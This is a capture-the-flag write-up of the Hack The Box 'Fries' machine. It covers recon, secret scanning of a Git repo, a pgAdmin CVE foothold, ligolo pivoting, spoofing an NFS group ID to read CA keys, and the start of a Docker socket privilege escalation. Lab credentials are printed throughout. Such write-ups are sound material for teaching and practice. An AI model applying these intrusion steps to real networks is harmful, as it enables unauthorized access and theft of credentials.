---
title: "Hack The Box — Fries"
date: 2026-2-05
categories: [HTB, Active Directory]
tags: [htb, ad, adcs, docker]
---

![](assets/images/fries/Pasted image 20260205204537.png)
#### Machine Information

Please allow up to 7 minutes for services to load. As is common in real life Windows penetration tests, you will start the Fries box with credentials for the following account : [d.cooper@fries.htb](mailto:d.cooper@fries.htb) / D4LE11maan!!


## Nmap

```sh
rustscan -a 10.10.11.96 -- -sC -sV

	_______
	
	PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 62  OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U=
|   256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 62  nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-12 21:56:21Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-12T21:58:10+00:00; +19m29s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
| Public Key type: rsa
| Public Key bits: 2048

443/tcp   open  ssl/http      syn-ack ttl 62  nginx 1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP/emailAddress=web@fries.htb/localityName=Madrid/organizationalUnitName=PWM Configuration
| Issuer: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP/emailAddress=web@fries.htb/localityName=Madrid/organizationalUnitName=PWM Configuration

445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-12T21:58:10+00:00; +19m29s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
|
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)

5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49924/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49967/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49995/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46245/tcp): CLEAN (Timeout)
|   Check 2 (port 18107/tcp): CLEAN (Timeout)
|   Check 3 (port 23943/udp): CLEAN (Timeout)
|   Check 4 (port 44222/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-01-12T21:57:28
|_  start_date: N/A
|_clock-skew: mean: 19m28s, deviation: 1s, median: 19m28s
```

### Port 80

![](assets/images/fries/friesport80.png)

### VHost Fuzzing
```sh
 ffuf -H "HOST: FUZZ.fries.htb" -w /usr/share/wordlists/dirb/common.txt -u http://fries.htb/  -fw 4

code                    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 210ms]
```

![Image description](assets/images/fries/2026-02-05_20-56.png)
i use the credentials  they provide

![](assets/images/fries/2026-02-05_21-01.png)

there was github project

![](assets/images/fries/2026-02-05_21-04.png)
we also find a another vhost
![](assets/images/fries/2026-02-05_21-09.png)
i use the cerd's
### trufflehog
before i used trufflehog to find secrets in this repo
```sh
➜  fires trufflehog git http://code.fries.htb/dale/fries.htb.git 

🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

Username for 'http://code.fries.htb': d.cooper@fries.htb
Password for 'http://d.cooper%40fries.htb@code.fries.htb': 
2026-02-05T17:55:50-05:00       info-0  trufflehog      running source  {"source_manager_worker_id": "kYiof", "with_units": true}
2026-02-05T17:55:50-05:00       info-0  trufflehog      scanning repo   {"source_manager_worker_id": "kYiof", "unit_kind": "dir", "unit": "/tmp/trufflehog-19612-1971688083", "repo": "http://code.fries.htb/dale/fries.htb.git"}
Found unverified result 🐷🔑❓
Detector Type: Postgres
Decoder Type: PLAIN
Raw result: postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432
Sslmode: <unset>
Commit: be59cceb54b56f00778822395bdf656216ab4b9f
Email: Dale Cooper <dale@fries.htb>
File: .env
Line: 1
Repository: http://code.fries.htb/dale/fries.htb.git
Repository_local_path: /tmp/trufflehog-19612-1971688083
Timestamp: 2025-05-28 09:30:36 +0000

2026-02-05T17:55:50-05:00       info-0  trufflehog      finished scanning       {"chunks": 41, "bytes": 76116, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "17m39.452908605s", "trufflehog_version": "3.93.0", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":5}}
```

now we have postgresql cerds
```sh
postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432
```
the pgAdmin has a CVE-2025-2945

![](assets/images/fries/2026-02-05_21-44.png)
now we have shell in pgAdmin container
env
```sh
cb46692a4590:/pgadmin4$ env
env
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CORRUPTED_DB_BACKUP_FILE=
PGAPPNAME=pgAdmin 4 - CONN:7404540
HOSTNAME=cb46692a4590
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/pgadmin4
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
OAUTHLIB_INSECURE_TRANSPORT=1
PYTHONPATH=/pgadmin4
SHLVL=3
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
cb46692a4590:/pgadmin4$ 
```

we need find DC ip
```sh
cb46692a4590:/tmp$ ping DC01.fries.htb
PING DC01.fries.htb (192.168.100.1): 56 data bytes
64 bytes from 192.168.100.1: seq=0 ttl=42 time=0.483 ms
```

```sh
sudo ip route add 192.168.100.0/24 dev ligolo
```

then Scan the internal network
```sh
cb46692a4590:/tmp$ ./nmap -p 1-65535 172.18.0.0/25
.
/nmap -p 1-65535 172.18.0.0/25

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-01-13 23:19 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for web (172.18.0.1)
Host is up (0.00065s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  sunrpc
443/tcp   open  https
2049/tcp  open  nfs
3000/tcp  open  unknown
8443/tcp  open  unknown
39517/tcp open  unknown
41243/tcp open  unknown
41845/tcp open  unknown
55441/tcp open  unknown
57897/tcp open  unknown

Nmap scan report for web.scripts_vpcbr2 (172.18.0.2)
Host is up (0.0012s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

Nmap scan report for postgres.scripts_vpcbr2 (172.18.0.3)
Host is up (0.0018s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap scan report for cb46692a4590 (172.18.0.4)
Host is up (0.00021s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for gitea.scripts_vpcbr2 (172.18.0.5)
Host is up (0.00087s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  unknown

Nmap scan report for pwm.scripts_vpcbr2 (172.18.0.6)
Host is up (0.00095s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8443/tcp open  unknown

Nmap done: 128 IP addresses (6 hosts up) scanned in 52.78 seconds
```

we Know we are in the container , there was nfs share in the 172.18.0.1 
we can't access direct so i set up a proxy i used ligolo-proxy

```sh
➜  www sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```
 download a agent in the container the run 
 ```sh
 ./agent -connect 10.10.15.96:11601 -ignore-cert
 ```

in attacker system
```sh
➜  www sudo ip route add 172.18.0.0/16 dev ligolo
ip route list
```

![](assets/images/fries/2026-02-05_22-08.png)
### nfs access
in nfs share
```sh
➜  fires showmount -a 172.18.0.1

All mount points on 172.18.0.1:
192.168.100.2:/srv/web.fries.htb
➜  fires sudo mount -t nfs 172.18.0.1:/srv/web.fries.htb /mnt/shares    
[sudo] password for kali: 
➜  fires ls /mnt/shares
certs  shared  webroot
```

we can't access certs folder other are empty and webroot was docker files
```sh
➜  shr ls -la /mnt/shares/certs/
ls: cannot open directory '/mnt/shares/certs/': Permission denied
```

```sh
➜  fires ls -ld /mnt/shares/certs

drwxrwx--- 2 root 59605603 4096 May 26  2025 /mnt/shares/certs
```

help of chatgpt
```sh
sudo groupadd -g 59605603 nfsgroup
sudo useradd -u 1001 -g 59605603 nfsuser
sudo -u nfsuser ls -la /mnt/shares/certs
```
now we can access 
```sh

➜  shr sudo -u nfsuser ls -la /mnt/shares/certs

total 32
drwxrwx--- 2 root nfsgroup 4096 May 26  2025 .
drw-r-xr-x 5  655 root     4096 May 28  2025 ..
-rw-r----- 1 root nfsgroup 1708 Feb  5  2026 ca-key.pem
-rw-r----- 1 root nfsgroup 1111 Feb  5  2026 ca.pem
-rw-r----- 1 root nfsgroup 1115 Feb  5  2026 server-cert.pem
-rw-r----- 1 root nfsgroup  940 Feb  5  2026 server.csr
-rw-r----- 1 root nfsgroup 1704 Feb  5  2026 server-key.pem
-rw-r----- 1 root nfsgroup  205 Feb  5  2026 server-openssl.cnf
```
## ssh web
we can login web useing cerds in env
```sh
➜  ~ ssh svc@fries.htb 
svc@fries.htb's password:

Last login: Wed Nov 19 20:53:19 2025 from 10.10.14.77
svc@web:~$ 
```
### Docker Priv

the port exposed 2375
Exposing your Docker daemon socket over an unauthenticated TCP port is one of the most critical security misconfigurations you can make. It is not merely a vulnerability; it is a direct, unauthenticated gateway to a root shell on your host machine. This means that anyone who can find that open port on the internet can gain complete control over your server, its data, and any services it [runs](https://medium.com/@instatunnel/docker-socket-security-a-critical-vulnerability-guide-76f4137a68c5).

```sh
svc@web:~$ ss -ntlp
State      Recv-Q     Send-Q         Local Address:Port          Peer Address:Port     Process     
LISTEN     0          4096               127.0.0.1:222                0.0.0.0:*  
LISTEN     0          511                  0.0.0.0:443                0.0.0.0:*  
LISTEN     0          4096                 0.0.0.0:8443               0.0.0.0:*  
LISTEN     0          4096               127.0.0.1:2376               0.0.0.0:*  
LISTEN     0          64                   0.0.0.0:2049               0.0.0.0:*  
LISTEN     0          128                  0.0.0.0:22                 0.0.0.0:*  
LISTEN     0          511                  0.0.0.0:80                 0.0.0.0:*  
LISTEN     0          4096                 0.0.0.0:111                0.0.0.0:*  
LISTEN     0          4096               127.0.0.1:5000               0.0.0.0:*  
LISTEN     0          4096               127.0.0.1:5050               0.0.0.0:*  
LISTEN     0          4096               127.0.0.1:3000               0.0.0.0:*  
LISTEN     0          4096                 0.0.0.0:44501              0.0.0.0:*  
```

```sh
export DOCKER_HOST=tcp://127.0.0.1:2376
export DOCKER_TLS_VERIFY=1
export DOCKER_CERT_PATH=/tmp/cert
```









### Port 443

![Image description](assets/images/fries/friesport443.png)

